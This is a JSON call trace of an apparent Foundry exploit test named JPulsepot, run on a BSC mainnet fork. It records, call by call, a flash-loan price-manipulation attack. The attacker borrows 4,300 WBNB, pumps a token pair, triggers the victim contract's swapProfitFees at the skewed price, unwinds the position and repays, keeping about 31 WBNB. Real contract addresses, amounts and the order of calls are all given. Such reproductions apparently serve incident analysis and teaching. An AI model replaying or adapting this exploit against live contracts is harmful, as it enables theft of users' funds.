{
  "logs": {
    "calls": [
      {
        "id": "7939",
        "contract": "ExploitScript",
        "function": "setUp",
        "value": null,
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "0",
            "contract": "VM",
            "function": "createSelectFork",
            "value": null,
            "args": "\"mainnet\", 1234567 [1.234e6]",
            "return_value": "0",
            "depth": 1,
            "internal_calls": []
          }
        ]
      },
      {
        "id": "23756",
        "contract": "ExploitScript",
        "function": "testExploit",
        "value": null,
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "0",
            "contract": "VM",
            "function": "deal",
            "value": null,
            "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": []
          }
        ]
      },
      {
        "id": "10740",
        "contract": "JPulsepot",
        "function": "setUp",
        "value": null,
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "0",
            "contract": "VM",
            "function": "createSelectFork",
            "value": null,
            "args": "\"bsc\", 45640245 [4.564e7]",
            "return_value": "0",
            "depth": 1,
            "internal_calls": []
          }
        ]
      },
      {
        "id": "921668",
        "contract": "JPulsepot",
        "function": "testExploit",
        "value": null,
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "3264",
            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "function": "symbol",
            "value": null,
            "args": "",
            "return_value": "\"WBNB\"",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "2534",
            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "function": "balanceOf",
            "value": null,
            "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
            "return_value": "0",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "2444",
            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "function": "decimals",
            "value": null,
            "args": "",
            "return_value": "18",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "874244",
            "contract": "0x172fcD41E0913e95784454622d1c3724f546f849",
            "function": "flash",
            "value": null,
            "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 4300000000000000000000 [4.3e21], 0x0000000000000000000000000000000000000000000000e91a7cd19fa3b00000",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [
              {
                "id": "2531",
                "contract": "0x55d398326f99059fF775485246999027B3197955",
                "function": "balanceOf",
                "value": null,
                "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
                "return_value": "3178686471569296579127296 [3.178e24]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "2534",
                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "function": "balanceOf",
                "value": null,
                "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
                "return_value": "4478385724514701387203 [4.478e21]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "25962",
                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "function": "transfer",
                "value": null,
                "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4300000000000000000000 [4.3e21]",
                "return_value": "true",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "812373",
                "contract": "JPulsepot",
                "function": "pancakeV3FlashCallback",
                "value": null,
                "args": "0, 430000000000000000 [4.3e17], 0x0000000000000000000000000000000000000000000000e91a7cd19fa3b00000",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "24420",
                    "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                    "function": "approve",
                    "value": null,
                    "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "89204",
                    "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                    "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                    "value": null,
                    "args": "4300000000000000000000 [4.3e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD], JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1736501998 [1.736e9]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "8225",
                        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                        "function": "transferFrom",
                        "value": null,
                        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x824eb9faDFb377394430d2744fa7C42916DE3eCe, 4300000000000000000000 [4.3e21]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2531",
                        "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                        "function": "balanceOf",
                        "value": null,
                        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "0",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2893",
                        "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                        "function": "getReserves",
                        "value": null,
                        "args": "",
                        "return_value": "575059722221790815001 [5.75e20], 19683020234934991242367 [1.968e22], 1736501716 [1.736e9]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "534",
                        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                        "function": "balanceOf",
                        "value": null,
                        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                        "return_value": "4875059722221790815001 [4.875e21]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "62348",
                        "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                        "function": "swap",
                        "value": null,
                        "args": "0, 17356089427655381925726 [1.735e22], JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "27971",
                            "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                            "function": "transfer",
                            "value": null,
                            "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17356089427655381925726 [1.735e22]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "534",
                            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                            "function": "balanceOf",
                            "value": null,
                            "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "return_value": "4875059722221790815001 [4.875e21]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "531",
                            "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                            "function": "balanceOf",
                            "value": null,
                            "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "return_value": "2326930807279609316641 [2.326e21]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "531",
                        "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                        "function": "balanceOf",
                        "value": null,
                        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "17356089427655381925726 [1.735e22]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "602045",
                    "contract": "0x384b9fb6E42dab87F3023D87ea1575499A69998E",
                    "function": "swapProfitFees",
                    "value": null,
                    "args": "",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "5151",
                        "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                        "function": "getAmountsIn",
                        "value": null,
                        "args": "48090000000000000000 [4.809e19], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
                        "return_value": "[103135416163530787817 [1.031e20], 48090000000000000000 [4.809e19]]",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "893",
                            "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "5111",
                        "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                        "function": "getAmountsOut",
                        "value": null,
                        "args": "17600400000000000000 [1.76e19], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
                        "return_value": "[17600400000000000000 [1.76e19], 8349832622427605647 [8.349e18]]",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "893",
                            "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "13631",
                        "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                        "function": "getAmountsIn",
                        "value": null,
                        "args": "22020000000000000000 [2.202e19], [0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
                        "return_value": "[217902307222553107209870 [2.179e23], 46690682950839373836 [4.669e19], 22020000000000000000 [2.202e19]]",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "893",
                            "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "2893",
                            "contract": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "121263025417142429893090 [1.212e23], 72739253315769478301 [7.273e19], 1736491495 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "9035",
                        "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                        "function": "getAmountsOut",
                        "value": null,
                        "args": "36597855250000000000000 [3.659e22], [0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
                        "return_value": "[36597855250000000000000 [3.659e22], 16831183026189930161 [1.683e19], 7986159668894686738 [7.986e18]]",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "893",
                            "contract": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "121263025417142429893090 [1.212e23], 72739253315769478301 [7.273e19], 1736491495 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "893",
                            "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "24596",
                        "contract": "0x4D9927a8Dc4432B93445dA94E4084D292438931F",
                        "function": "approve",
                        "value": null,
                        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 36597855250000000000000 [3.659e22]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "119455",
                        "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                        "function": "swapExactTokensForETH",
                        "value": null,
                        "args": "36597855250000000000000 [3.659e22], 0, [0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x384b9fb6E42dab87F3023D87ea1575499A69998E, 1736501998 [1.736e9]",
                        "return_value": "[36597855250000000000000 [3.659e22], 16831183026189930161 [1.683e19]]",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "893",
                            "contract": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "121263025417142429893090 [1.212e23], 72739253315769478301 [7.273e19], 1736491495 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "28303",
                            "contract": "0x4D9927a8Dc4432B93445dA94E4084D292438931F",
                            "function": "transferFrom",
                            "value": null,
                            "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA, 36597855250000000000000 [3.659e22]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "2676",
                                "contract": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73",
                                "function": "getPair",
                                "value": null,
                                "args": "0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                                "return_value": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "64816",
                            "contract": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                            "function": "swap",
                            "value": null,
                            "args": "0, 16831183026189930161 [1.683e19], 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "29962",
                                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                                "function": "transfer",
                                "value": null,
                                "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 16831183026189930161 [1.683e19]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "1008",
                                "contract": "0x4D9927a8Dc4432B93445dA94E4084D292438931F",
                                "function": "balanceOf",
                                "value": null,
                                "args": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                                "return_value": "157860880667142429893090 [1.578e23]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "534",
                                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                                "function": "balanceOf",
                                "value": null,
                                "args": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
                                "return_value": "55908070289579548140 [5.59e19]",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "9223",
                            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                            "function": "withdraw",
                            "value": null,
                            "args": "16831183026189930161 [1.683e19]",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "83",
                                "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                                "function": "fallback",
                                "value": "value: 16831183026189930161",
                                "args": "",
                                "return_value": "Returned",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "55",
                            "contract": "0x384b9fb6E42dab87F3023D87ea1575499A69998E",
                            "function": "fallback",
                            "value": "value: 16831183026189930161",
                            "args": "",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "81228",
                        "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                        "function": "swapExactETHForTokens",
                        "value": "value: 34431583026189930161",
                        "args": "0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD], 0x384b9fb6E42dab87F3023D87ea1575499A69998E, 1736501998 [1.736e9]",
                        "return_value": "[34431583026189930161 [3.443e19], 16278878565747828785 [1.627e19]]",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "893",
                            "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "function": "getReserves",
                            "value": null,
                            "args": "",
                            "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "21974",
                            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                            "function": "deposit",
                            "value": "value: 34431583026189930161",
                            "args": "",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "3262",
                            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                            "function": "transfer",
                            "value": null,
                            "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe, 34431583026189930161 [3.443e19]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "40264",
                            "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "function": "swap",
                            "value": null,
                            "args": "0, 16278878565747828785 [1.627e19], 0x384b9fb6E42dab87F3023D87ea1575499A69998E, 0x",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "25171",
                                "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                                "function": "transfer",
                                "value": null,
                                "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 16278878565747828785 [1.627e19]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "534",
                                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                                "function": "balanceOf",
                                "value": null,
                                "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                                "return_value": "4909491305247980745162 [4.909e21]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "531",
                                "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                                "function": "balanceOf",
                                "value": null,
                                "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                                "return_value": "2310651928713861487856 [2.31e21]",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          }
                        ]
                      },
                      {
                        "id": "24562",
                        "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                        "function": "approve",
                        "value": null,
                        "args": "0x1FCc3B22955e76Ca48bF025f1A6993685975Bb9e, 16278878565747828785 [1.627e19]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "67053",
                        "contract": "0x1FCc3B22955e76Ca48bF025f1A6993685975Bb9e",
                        "function": "swap",
                        "value": null,
                        "args": "16278878565747828785 [1.627e19], 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD, 0x404460C6A5EdE2D891e8297795264fDe62ADBB75",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "10834",
                            "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                            "function": "transferFrom",
                            "value": null,
                            "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 0x1FCc3B22955e76Ca48bF025f1A6993685975Bb9e, 16278878565747828785 [1.627e19]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "30445",
                            "contract": "0x404460C6A5EdE2D891e8297795264fDe62ADBB75",
                            "function": "transfer",
                            "value": null,
                            "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 16278878565747828785 [1.627e19]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "32995",
                        "contract": "0x404460C6A5EdE2D891e8297795264fDe62ADBB75",
                        "function": "transferAndCall",
                        "value": null,
                        "args": "0xc587d9053cd1118f25F645F9E08BB98c9712A4EE, 16278878565747828785 [1.627e19], 0x00000000000000000000000000000000000000000000000000000000000002a3",
                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "17758",
                            "contract": "0xc587d9053cd1118f25F645F9E08BB98c9712A4EE",
                            "function": "onTokenTransfer",
                            "value": null,
                            "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 16278878565747828785 [1.627e19], 0x00000000000000000000000000000000000000000000000000000000000002a3",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "24562",
                    "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                    "function": "approve",
                    "value": null,
                    "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "531",
                    "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                    "function": "balanceOf",
                    "value": null,
                    "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "17356089427655381925726 [1.735e22]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "53973",
                    "contract": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                    "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                    "value": null,
                    "args": "17356089427655381925726 [1.735e22], 0, [0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1736501998 [1.736e9]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "6034",
                        "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                        "function": "transferFrom",
                        "value": null,
                        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x824eb9faDFb377394430d2744fa7C42916DE3eCe, 17356089427655381925726 [1.735e22]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "534",
                        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                        "function": "balanceOf",
                        "value": null,
                        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "0",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "893",
                        "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                        "function": "getReserves",
                        "value": null,
                        "args": "",
                        "return_value": "4909491305247980745162 [4.909e21], 2310651928713861487856 [2.31e21], 1736501998 [1.736e9]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "531",
                        "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                        "function": "balanceOf",
                        "value": null,
                        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                        "return_value": "19666741356369243413582 [1.966e22]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "38255",
                        "contract": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                        "function": "swap",
                        "value": null,
                        "args": "4331398120414037532669 [4.331e21], 0, JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "23162",
                            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                            "function": "transfer",
                            "value": null,
                            "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4331398120414037532669 [4.331e21]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "534",
                            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                            "function": "balanceOf",
                            "value": null,
                            "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "return_value": "578093184833943212493 [5.78e20]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "531",
                            "contract": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
                            "function": "balanceOf",
                            "value": null,
                            "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
                            "return_value": "19666741356369243413582 [1.966e22]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "534",
                        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                        "function": "balanceOf",
                        "value": null,
                        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "4331398120414037532669 [4.331e21]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "3262",
                    "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                    "function": "transfer",
                    "value": null,
                    "args": "0x172fcD41E0913e95784454622d1c3724f546f849, 4300430000000000000000 [4.3e21]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              },
              {
                "id": "531",
                "contract": "0x55d398326f99059fF775485246999027B3197955",
                "function": "balanceOf",
                "value": null,
                "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
                "return_value": "3178686471569296579127296 [3.178e24]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "534",
                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "function": "balanceOf",
                "value": null,
                "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
                "return_value": "4478815724514701387203 [4.478e21]",
                "depth": 2,
                "internal_calls": []
              }
            ]
          },
          {
            "id": "1264",
            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "function": "symbol",
            "value": null,
            "args": "",
            "return_value": "\"WBNB\"",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "534",
            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "function": "balanceOf",
            "value": null,
            "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
            "return_value": "30968120414037532669 [3.096e19]",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "444",
            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "function": "decimals",
            "value": null,
            "args": "",
            "return_value": "18",
            "depth": 1,
            "internal_calls": []
          }
        ]
      }
    ]
  }
}